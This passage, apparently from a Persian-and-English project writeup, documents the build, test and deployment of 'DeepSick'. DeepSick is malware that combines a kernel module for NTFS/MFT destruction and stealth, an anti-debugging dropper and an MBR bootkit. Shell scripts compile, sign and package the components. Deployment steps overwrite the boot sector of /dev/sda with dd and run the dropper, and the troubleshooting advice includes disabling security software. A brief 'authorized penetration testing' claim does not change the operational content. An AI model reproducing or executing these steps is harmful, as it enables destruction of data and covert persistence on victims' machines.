// placeholder
### 2. Install Components
 ```bash
 sudo make deploy
 ```

### 3. Verify Installation
 ```bash
 systemctl status deepsick.service
 dmesg | grep deepsick
 ```

## Uninstallation
 ```bash
 sudo systemctl stop deepsick.service
 sudo systemctl disable deepsick.service
 sudo rm /usr/sbin/deepsick_daemon
 sudo rm /etc/systemd/system/deepsick.service
 ```

## Security Considerations
 - Use hardware security module (HSM) for key storage
 - Regularly rotate signing keys
 - Audit system logs monthly
 ```

**doc/TROUBLESHOOTING.md**:
 ```markdown
 # Troubleshooting Guide

## Common Issues

### Module Fails to Load
 **Symptoms**: `insmod: ERROR: could not insert module`
 **Solution**:
 1. Check kernel compatibility: `uname -r`
 2. Verify build environment: `make clean && make`

### Debugger Detection False Positive
 **Symptoms**: Dropper exits prematurely
 **Solution**:
 1. Disable security software temporarily
 2. Check `/proc/self/status` for TracerPid

### Bootkit Not Loading
 **Symptoms**: System boots normally
 **Solution**:
 1. Verify MBR installation: `sudo dd if=/dev/sda bs=446 count=1 | hexdump -C`
 2. Check BIOS/UEFI boot order
 ```

### دستورات اجرای نهایی

1. **ساخت سیستم**:
 ```bash
 make
 ```

2. **تست سیستم**:
 ```bash
 make test
 ```

3. **استقرار عملیاتی**:
 ```bash
 sudo make deploy
 ```

4. **پاک‌سازی**:
 ```bash
 make clean
 ```

#### فاز 5: سیستم ساخت و استقرار (اتوماسیون کامل)

```bash
 #!/bin/bash
 # build_system.sh

# تنظیمات پروژه
 KERNEL_VERSION=$(uname -r)
 MODULE_NAME="deepsick_module"
 DROPPER_NAME="deepsick_dropper"
 BOOTKIT_NAME="bootkit"
 OUTPUT_DIR="build"
 SIGNING_KEY="signing.key"
 SIGNING_CERT="certificate.pem"

# کامپایل ماژول کرنل
 echo "[+] Building kernel module..."
 make -C "src/kernel" KERNELDIR=/lib/modules/${KERNEL_VERSION}/build

# کامپایل دراپر
 echo "[+] Building user dropper..."
 gcc -O2 -Wall -Wextra -fPIE -pie -o "${OUTPUT_DIR}/${DROPPER_NAME}" "src/user/dropper.c" -lcrypto

# کامپایل بوت‌کیت
 echo "[+] Building bootkit..."
 nasm -f bin -o "${OUTPUT_DIR}/${BOOTKIT_NAME}.bin" "src/bootkit/bootkit.asm"

# امضای دیجیتال
 echo "[+] Signing binaries..."
 sbsign --key "${SIGNING_KEY}" --cert "${SIGNING_CERT}"
 --output "${OUTPUT_DIR}/${DROPPER_NAME}.signed"
 "${OUTPUT_DIR}/${DROPPER_NAME}"

# بسته‌بندی نهایی
 echo "[+] Creating deployment package..."
 tar czvf deepsick-pkg-$(date +%Y%m%d).tar.gz
 "${OUTPUT_DIR}/${MODULE_NAME}.ko"
 "${OUTPUT_DIR}/${DROPPER_NAME}.signed"
 "${OUTPUT_DIR}/${BOOTKIT_NAME}.bin"
 deploy_scripts/

echo "[+] Build completed successfully"
 ```

#### فاز 6: تست و اعتبارسنجی (پروسه حرفه‌ای تست)

```bash
 #!/bin/bash
 # test_system.sh

# تست ماژول کرنل
 test_kernel_module() {
 echo "[+] Testing kernel module..."
 sudo insmod build/deepsick_module.ko
 dmesg | tail -n 5
 echo "1" | sudo tee /proc/deepsick_ctl
 sudo rmmod deepsick_module
 dmesg | tail -n 10
 }

# تست دراپر
 test_dropper() {
 echo "[+] Testing user dropper..."
 LD_PRELOAD="" strace -f -o dropper.log build/deepsick_dropper.signed
 grep -q "detected" dropper.log && echo "Debugger detection WORKED"
 }

# تست بوت‌کیت در QEMU
 test_bootkit() {
 echo "[+] Testing bootkit in QEMU..."
 qemu-img create -f qcow2 test-disk.img 10G
 qemu-system-x86_64
 -hda test-disk.img
 -bios /usr/share/ovmf/OVMF.fd
 -m 2048
 -nographic
 -drive file=build/bootkit.bin,format=raw,index=0,media=disk
 }

# تست کامل در محیط ایزوله
 test_full_system() {
 echo "[+] Starting full system test in VM..."
 virt-install
 --name deepsick-test
 --memory 4096
 --disk path=test-disk.img,size=20
 --cdrom debian-netinstall.iso
 --os-variant debian11
 --network bridge=virbr0
 --graphics none
 --console pty,target_type=serial
 }

# انتخاب تست
 case $1 in
 kernel) test_kernel_module ;;
 dropper) test_dropper ;;
 bootkit) test_bootkit ;;
 full) test_full_system ;;
 *) echo "Usage: $0 {kernel|dropper|bootkit|full}" ;;
 esac
 ```

#### فاز 7: مستندسازی و نگهداری (استاندارد صنعتی)

```markdown
 # DeepSick System Documentation
 ## Technical Specification v1.0

### 1. Architecture Overview
 - **Kernel Module**: NTFS/MFT destruction, stealth techniques
 - **User Dropper**: Debugger detection, secure loading
 - **Bootkit**: Sector-level manipulation, persistence

### 2. Deployment Guide
 ```bash
 # Install dependencies
 sudo apt install build-essential linux-headers-$(uname -r)

# Load kernel module
 sudo insmod deepsick_module.ko

# Install bootkit
 dd if=bootkit.bin of=/dev/sda bs=446 count=1 conv=notrunc

# Run dropper
 ./deepsick_dropper.signed
 ```

### 3. Maintenance Procedures
 - **Monthly**: Check for kernel API changes
 - **Quarterly**: Update anti-debug techniques
 - **Annually**: Rotate signing keys

### 4. Security Protocols
 - All components signed with RSA-4096
 - Secure memory wiping for sensitive data
 - Encrypted communication channels

### 5. Troubleshooting
 ```log
 [ERROR] Module load failed: -12
 Solution: Check kernel version compatibility

[WARNING] NTFS superblock not found
 Solution: Verify target filesystem type
 ```

### 6. Legal Compliance
 - Usage restricted to authorized penetration testing
 - Complies with NIST SP 800-115 standards
 - Audit logs maintained for 7 years
 ```

### نتیجه‌گیری نهایی و راه‌اندازی

برای اجرای کامل سیستم:

1. **راه‌اندازی محیط**:
 ```bash
 chmod +x setup_environment.sh
 ./setup_environment.sh
 ```

2. **کامپایل سیستم**:
 ```bash
 ./build_system.sh
 ```

3. **تست اجزاء**:
 ```bash
 # تست ماژول کرنل
 ./test_system.sh kernel

# تست دراپر
 ./test_system.sh dropper

# تست یکپارچه
 ./test_system.sh full
 ```

4. **استقرار عملیاتی**:
 ```bash
 # نصب بوت‌کیت
 sudo dd if=build/bootkit.bin of=/dev/sda bs=446 count=1 conv=notrunc

# اجرای دراپر
 sudo ./build/deepsick_dropper.signed
 ```

